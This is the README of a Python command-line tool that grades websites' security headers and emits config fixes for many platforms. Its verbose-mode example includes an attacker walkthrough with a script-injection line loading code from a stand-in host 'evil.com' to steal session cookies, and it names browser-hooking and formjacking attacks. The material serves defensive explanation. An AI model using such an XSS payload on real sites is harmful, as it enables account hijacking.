# header-grade 🔒

> Security headers grader CLI — check any URL, get an A–F grade, generate a ready-to-paste fix for your platform, and understand *exactly* how an attacker would exploit each missing header.

[![CI](https://github.com/youcefimohamed/header-grade/actions/workflows/ci.yml/badge.svg)](https://github.com/youcefimohamed/header-grade/actions)
[![Python 3.9+](https://img.shields.io/badge/python-3.9+-blue.svg)](https://www.python.org/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)

---

## Why header-grade?

[securityheaders.com](https://securityheaders.com) is great for one-off manual checks.  
**header-grade** is for developers who want to:

- **Audit from the terminal** without opening a browser
- **Gate CI/CD pipelines** — fail the build if the grade drops below B
- **Get a copy-paste fix** for nginx, Next.js, Vercel, Cloudflare Workers, and [24 other platforms](#platforms)
- **Understand the attack** — every missing header ships with a step-by-step attacker walkthrough and PortSwigger/OWASP exploit references
- **Watch headers in real time** while actively deploying (`--watch 10`)
- **Pipe into `jq`**, Slack, dashboards, or SARIF upload (`--format json` / `--format github`)

---

## Installation

```bash
pip install header-grade
```

Or with [pipx](https://pipx.pypa.io/) (recommended for CLI tools):

```bash
pipx install header-grade
```

Or from source:

```bash
git clone https://github.com/youcefimohamed/header-grade
cd header-grade
pip install -e .
```

Both `header-grade` and the short alias `hg` are installed.

---

## Quick start

```bash
hg example.com
```

```
╭─ Security Headers Report ──────────────────────────────────────────╮
│                                                                     │
│  B   https://example.com                                           │
│  🔒 HTTPS                                                          │
│                                                                     │
│  Score: ████████████░░░░░░░░░░░░░░  48/100                        │
│                                                                     │
╰─────────────────────────────────────────────────────────────────────╯

  ✗  Content-Security-Policy         Missing    -30
  ✓  Strict-Transport-Security       Present      0
  ✓  X-Frame-Options                 Present      0
  ✓  X-Content-Type-Options          Present      0
  ✗  Referrer-Policy                 Missing    -10
  ✗  Permissions-Policy              Missing    -10
  ✗  Cross-Origin-Opener-Policy      Missing     -5
  ✗  Cross-Origin-Embedder-Policy    Missing     -5
  ✗  Cross-Origin-Resource-Policy    Missing     -5
  ...

💡 Get a ready-to-paste fix snippet:
   hg fix example.com --platform nginx  (detected from Server: nginx/1.24.0)
```

---

## Commands

### `hg check` — grade a URL

```bash
hg example.com                          # basic check (check is the default command)
hg check example.com --verbose          # full descriptions + attacker exploit walkthrough
hg check example.com -v                 # same, short flag
```

#### Output formats

```bash
hg check example.com --format text      # rich terminal output (default)
hg check example.com --format json      # machine-readable JSON
hg check example.com --format minimal   # one line: URL grade score
hg check example.com --format markdown  # Markdown for GitHub PRs / wikis
hg check example.com --format github    # GitHub Actions annotations (::error::, ::warning::)
```

#### CI gate

```bash
hg check example.com --min-grade B      # exit 1 if grade < B
hg check example.com --min-grade A      # exit 1 if grade < A
```

Exit codes: `0` = passed (or no threshold set), `1` = grade below threshold / fetch error, `2` = bad arguments.

#### Watch mode — re-check while you deploy

```bash
hg check example.com --watch 10                       # re-check every 10 s
hg check example.com --watch 5 --min-grade B          # stop when grade reaches B
hg check example.com --watch 30 --format minimal      # one-line updates
```

Useful when you've just pushed a config change and want to see the grade improve in real time.

#### All options

```
Arguments:
  URL                       URL to check (https:// added if missing)

Options:
  -v, --verbose             Show full descriptions, fix suggestions, and attacker exploit scenarios
  -f, --format FORMAT       text (default), json, minimal, markdown, github
  --min-grade GRADE         Fail (exit 1) if grade is below: A+, A, B, C, D, E, F
  -w, --watch SECONDS       Re-check every N seconds until grade passes or Ctrl-C
  -t, --timeout FLOAT       Request timeout in seconds [default: 15.0]
  --no-redirects            Do not follow HTTP redirects
  --no-verify-ssl           Skip SSL certificate verification
  -V, --version             Show version and exit
  --help                    Show this message and exit
```

---

### `hg fix` — generate a platform config snippet

```bash
hg fix example.com --platform nginx
hg fix example.com --platform vercel > vercel.json
hg fix example.com --platform nextjs >> next.config.js
hg fix example.com --platform cloudflare > src/index.ts
hg fix example.com -p hono
```

The tool checks the URL, identifies every missing or weak header, and emits a ready-to-paste config snippet with the exact values to add. No platform flag? It shows the menu:

```bash
hg fix example.com    # → shows platform categories and how to pick one
```

---

### `hg platforms` — list all 27 platforms

```bash
hg platforms
hg platforms --format json
```

```
Available platforms  (27 total — use with `hg fix URL --platform <id>`)

Classic servers
  nginx         Nginx                 Inside server {} block
  apache        Apache                .htaccess or VirtualHost (mod_headers)
  caddy         Caddy                 Inside your Caddyfile site block
  traefik       Traefik               Dynamic config YAML + Docker labels
  haproxy       HAProxy               haproxy.cfg frontend/backend section

Edge / cloud platforms
  vercel        Vercel                vercel.json at project root
  netlify       Netlify               _headers file at publish directory root
  cloudflare    Cloudflare            Workers (src/index.ts) + Pages (_headers)

JavaScript / TypeScript
  nextjs        Next.js               next.config.js at project root
  remix         Remix                 app/entry.server.tsx
  astro         Astro                 src/middleware.ts (SSR) or public/_headers
  sveltekit     SvelteKit             src/hooks.server.ts
  nuxt          Nuxt                  nuxt.config.ts
  express       Express/Helmet        app.js / server.js
  hono          Hono                  Multi-runtime: CF Workers, Bun, Deno, Node
  bun           Bun                   server.ts using Bun.serve() or Elysia
  deno          Deno                  src/server.ts using Deno.serve() or Oak

Python
  django        Django                settings.py + django-csp
  flask         Flask                 flask-talisman
  fastapi       FastAPI               Starlette middleware

Java / JVM
  springboot    Spring Boot           SecurityConfig.java

PHP
  laravel       Laravel               Kernel.php middleware

Ruby
  rails         Ruby on Rails         config/initializers/secure_headers.rb

.NET
  aspnet        ASP.NET Core          Program.cs / Startup.cs + web.config

Systems languages
  go            Go (net/http)         Middleware function wrapping your Handler
  rust-axum     Rust (Axum)           Axum 0.7 + tower-http SetResponseHeadersLayer
  elixir        Elixir/Phoenix        Plug + router pipeline
```

---

### `hg batch` — check multiple URLs

```bash
hg batch urls.txt                           # one URL per line (# comments ignored)
hg batch https://a.com https://b.com        # inline URLs
hg batch urls.txt --format json             # JSON array
hg batch urls.txt --format github           # GitHub Actions annotations for all URLs
hg batch urls.txt --min-grade B             # exit 1 if any URL < B
hg batch urls.txt --concurrency 10          # 10 concurrent requests
```

---

## Verbose mode — attacker exploit walkthroughs

Every missing or misconfigured header ships with a step-by-step attacker walkthrough and links to PortSwigger labs, OWASP guides, and CVEs:

```bash
hg check example.com --verbose
```

```
✗ Content-Security-Policy  [CRITICAL]
  Content-Security-Policy is missing

  CSP is your primary defence against Cross-Site Scripting (XSS). Without
  it, any injected script runs with full page privileges — reading cookies,
  sending credentials elsewhere, and hijacking the UI.

  How to fix:
    Content-Security-Policy-Report-Only: default-src 'self';
    script-src 'self' 'nonce-RANDOM'; object-src 'none'; ...

  How an attacker exploits this:
    1. Attacker finds a reflected input: example.com/search?q=<INPUT>
    2. Injects: <script src='https://evil.com/steal.js'></script>
    3. Without CSP, browser executes the injected script with full page privileges
    4. Script reads session cookies → sends them to attacker's server
    5. Attacker replays cookie → full account access, no password needed

    Advanced XSS chains (no CSP to stop them):
    • DOM clobbering → prototype pollution → RCE in Node.js-rendered apps
    • BeEF framework hooks the browser: attacker gets live keyboard/mouse control
    • Formjacking: keylogger on checkout pages (Magecart attacks)

  Exploit / PoC resources:
    https://portswigger.net/web-security/cross-site-scripting
    https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
    https://csp-evaluator.withgoogle.com/
    https://beefproject.com/
```

---

## GitHub Actions integration

### Inline PR annotations (`--format github`)

```yaml
# .github/workflows/security-headers.yml
name: Security Headers

on:
  deployment_status:

jobs:
  check:
    if: github.event.deployment_status.state == 'success'
    runs-on: ubuntu-latest
    steps:
      - run: pip install header-grade

      # Annotates the Actions log with ::error:: / ::warning:: per header
      - run: hg check ${{ github.event.deployment_status.target_url }} --format github

      # Or gate the pipeline:
      - run: hg check ${{ vars.PRODUCTION_URL }} --min-grade B
```

Output looks like:

```
::error title=Content-Security-Policy [missing]::CSP is missing — primary XSS defense. Score: -30. ...
::warning title=Referrer-Policy [missing]::Referrer-Policy is not set. Score: -10. ...
::notice title=header-grade::Grade: B (72/100)  URL: https://example.com  HTTPS: yes
```

GitHub renders these as inline annotations in the Actions log and (with SARIF upload) in the Security tab.

### Gate a deploy

```yaml
jobs:
  security-headers:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: pip install header-grade
      - run: hg check ${{ vars.PRODUCTION_URL }} --min-grade B
```

### Watch during staging deploy

```yaml
      - run: |
          # Wait up to 5 minutes for the deploy to apply headers correctly
          hg check ${{ vars.STAGING_URL }} --watch 15 --min-grade B
        timeout-minutes: 5
```

### GitLab CI

```yaml
security-headers:
  image: python:3.12-slim
  script:
    - pip install header-grade
    - hg check $PRODUCTION_URL --min-grade B --format github
```

---

## JSON output

```bash
hg check example.com --format json | jq '.grade'
hg check example.com --format json | jq '.findings[] | select(.status == "missing")'
hg check example.com --format json | jq '.findings[] | select(.severity == "critical")'
```

JSON schema:

```json
{
  "url": "https://example.com",
  "final_url": "https://example.com",
  "score": 72,
  "grade": "B",
  "https": true,
  "server": "nginx/1.24.0",
  "redirect_chain": [],
  "findings": [
    {
      "header": "Content-Security-Policy",
      "status": "missing",
      "severity": "critical",
      "score_impact": -30,
      "title": "Content-Security-Policy is missing",
      "description": "...",
      "current_value": null,
      "recommendation": "...",
      "references": ["https://..."],
      "exploit_scenario": "1. Attacker finds...",
      "exploit_references": ["https://portswigger.net/..."]
    }
  ],
  "summary": {
    "passed": 8,
    "total": 19,
    "critical_issues": 1,
    "high_issues": 2,
    "warnings": 3
  }
}
```

---

## Python API

Use header-grade as a library in your own scripts and tools:

```python
import asyncio
from header_grade.checker import check_url
from header_grade.fixgen import generate_fix
from header_grade.reporter import print_report, print_markdown

async def main():
    # Check a URL
    report = await check_url("https://example.com")

    print(f"Grade: {report.grade.value}  Score: {report.score}/100")

    # Iterate findings
    for finding in report.findings:
        if not finding.is_ok:
            print(f"  [{finding.severity.value.upper()}] {finding.header}: {finding.title}")
            if finding.exploit_scenario:
                print(f"    Exploit: {finding.exploit_scenario[:100]}...")

    # Generate a platform-specific fix
    snippet = generate_fix(report, "nginx")
    print(snippet)

    # Pretty-print to terminal
    print_report(report, verbose=True)

    # Markdown output
    print_markdown(report, verbose=True)

asyncio.run(main())
```

```python
# Batch check with concurrency
import asyncio
from header_grade.checker import check_url, FetchError

async def check_all(urls: list[str]) -> None:
    sem = asyncio.Semaphore(5)

    async def check_one(url: str):
        async with sem:
            try:
                r = await check_url(url)
                print(f"{r.grade.value:2s}  {r.score:3d}/100  {r.final_url}")
            except FetchError as e:
                print(f"ERR  {url}: {e}")

    await asyncio.gather(*[check_one(u) for u in urls])

asyncio.run(check_all([
    "https://github.com",
    "https://cloudflare.com",
    "https://vercel.com",
]))
```

---

## Headers checked (19 total)

| Header | Max penalty | What it prevents |
|--------|-------------|-----------------|
| `Content-Security-Policy` | −30 | XSS, data injection, script hijacking |
| `Strict-Transport-Security` | −25 | SSL stripping, HTTPS downgrade (sslstrip) |
| `X-Frame-Options` | −15 | Clickjacking (transparent iframe overlay) |
| `X-Content-Type-Options` | −10 | MIME sniffing → JPEG-served-as-JS XSS |
| `Referrer-Policy` | −10 | URL / token leakage via Referer header |
| `Permissions-Policy` | −10 | Unauthorized camera, mic, geo, payment access |
| `Cross-Origin-Opener-Policy` | −8 | XS-Leaks via window.opener, Spectre timing |
| `Cross-Origin-Embedder-Policy` | −8 | Spectre cross-origin pixel reads, SharedArrayBuffer abuse |
| `Cross-Origin-Resource-Policy` | −5 | Cross-origin resource inclusion + XS-Search timing |
| `Origin-Agent-Cluster` | −3 | Subdomain process-sharing Spectre attacks |
| `Set-Cookie` (flags) | −15 | XSS session theft (HttpOnly), CSRF (SameSite), interception (Secure) |
| `Set-Cookie` (Partitioned) | advisory | Cross-site tracking via SameSite=None cookies (CHIPS, Chrome 114+) |
| `Access-Control-Allow-Origin` (CORS) | −20 | Cross-origin data theft via credentialed fetch |
| `Cache-Control` | −8 | Web Cache Deception (PII cached by CDN) |
| `Reporting-Endpoints` | −4 | Blind to live CSP violations and COOP/COEP breaks (RFC 9512, 2024) |
| `X-Permitted-Cross-Domain-Policies` | −5 | Flash SWF cross-domain data theft |
| `Server` / `X-Powered-By` | −3 | Version fingerprinting → targeted CVE exploitation |
| Deprecated headers (HPKP, Feature-Policy…) | −3 | Active security risks from outdated headers |
| `X-XSS-Protection` | informational | (deprecated, XSS filter bypasses in IE; advises removal) |

**CSP deep analysis** also checks: `unsafe-inline`, `unsafe-eval`, `*` wildcards, `https:` scheme bypass, `data:` URIs in script-src, missing `object-src`, `base-uri`, `form-action`, and Trusted Types advisory (`require-trusted-types-for 'script'`).

### Grading scale

| Score | Grade |
|-------|-------|
| 95–100 | **A+** |
| 80–94  | **A**  |
| 65–79  | **B**  |
| 50–64  | **C**  |
| 35–49  | **D**  |
| 20–34  | **E**  |
| 0–19   | **F**  |

An additional **−10** penalty applies for plain HTTP (non-HTTPS) sites.

---

## Platforms (27)

| Category | Platform IDs |
|----------|-------------|
| Classic servers | `nginx` `apache` `caddy` `traefik` `haproxy` |
| Edge / cloud | `vercel` `netlify` `cloudflare` |
| JavaScript / TypeScript | `nextjs` `remix` `astro` `sveltekit` `nuxt` `express` `hono` `bun` `deno` |
| Python | `django` `flask` `fastapi` |
| Java | `springboot` |
| PHP | `laravel` |
| Ruby | `rails` |
| .NET | `aspnet` |
| Systems | `go` `rust-axum` `elixir` |

See descriptions: `hg platforms`  
Get a snippet: `hg fix example.com --platform <id>`

---

## Comparison

| | securityheaders.com | header-grade |
|---|---|---|
| GUI web interface | ✓ | — |
| CLI / terminal | — | ✓ |
| CI/CD gate (`--min-grade`) | — | ✓ |
| JSON output for scripting | — | ✓ |
| GitHub Actions annotations | — | ✓ |
| Platform-specific fix snippets (27) | — | ✓ |
| Attacker exploit walkthrough | — | ✓ |
| Watch mode (re-poll) | — | ✓ |
| Offline / private URLs | — | ✓ |
| Python library | — | ✓ |

---

## Development

```bash
git clone https://github.com/youcefimohamed/header-grade
cd header-grade
pip install -e ".[dev]"

pytest                                          # run tests
pytest --cov=header_grade --cov-report=term-missing  # with coverage
python -m ruff check src/ tests/               # lint
mypy src/header_grade/                         # type check
```

### Adding a new header checker

1. Create `src/header_grade/headers/my_header.py` inheriting `BaseHeaderChecker`
2. Set `header_name` (lowercase), `max_penalty`, `bonus`
3. Implement `check(self, headers: dict[str, str]) -> HeaderFinding`
4. Include `exploit_scenario` and `exploit_references` in every non-OK finding
5. Register in `src/header_grade/headers/__init__.py` → `ALL_CHECKERS`
6. Add tests in `tests/test_headers/test_my_header.py`

```python
# src/header_grade/headers/my_header.py
from ..models import FindingStatus, HeaderFinding, Severity
from .base import BaseHeaderChecker

class MyHeaderChecker(BaseHeaderChecker):
    header_name = "my-security-header"
    max_penalty = 10
    bonus = 0

    def check(self, headers: dict[str, str]) -> HeaderFinding:
        value = self._get(headers)

        if value is None:
            return HeaderFinding(
                header="My-Security-Header",
                status=FindingStatus.MISSING,
                severity=Severity.HIGH,
                score_impact=-self.max_penalty,
                title="My-Security-Header is not set",
                description="...",
                recommendation="Add: My-Security-Header: safe-value",
                references=["https://developer.mozilla.org/..."],
                exploit_scenario="1. Attacker does X\n2. Because header is missing...",
                exploit_references=["https://portswigger.net/..."],
            )

        return HeaderFinding(
            header="My-Security-Header",
            status=FindingStatus.PRESENT,
            severity=Severity.HIGH,
            score_impact=0,
            title="My-Security-Header is set correctly",
            description="...",
            current_value=value,
        )
```

---

## License

MIT © youcefimohamed
